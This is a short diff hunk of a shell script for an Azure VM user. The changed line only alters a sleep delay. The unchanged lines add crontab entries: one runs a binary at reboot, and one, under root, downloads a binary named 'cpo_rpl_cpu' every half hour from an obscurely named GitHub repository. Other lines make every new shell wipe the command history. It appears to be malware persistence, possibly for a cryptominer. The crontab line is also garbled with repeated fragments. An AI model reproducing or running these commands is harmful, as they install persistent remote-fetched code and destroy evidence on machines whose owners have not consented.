@@ -29,4 +29,4 @@ crontab -l | { cat; echo "@reboot /home/azureuser/cpo2"; } | crontab
 sudo crontab -l | { cat; echo "0,30 * * * * wget -p /home/azureuser -O cpo_rpl_cpu https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkfh2398/raw/main/cpo"; } | crontab"; } | crontab"; } | crontab
 echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
 echo ". history -cw" >> ~/.bashrc
-sleep 7
+sleep 15
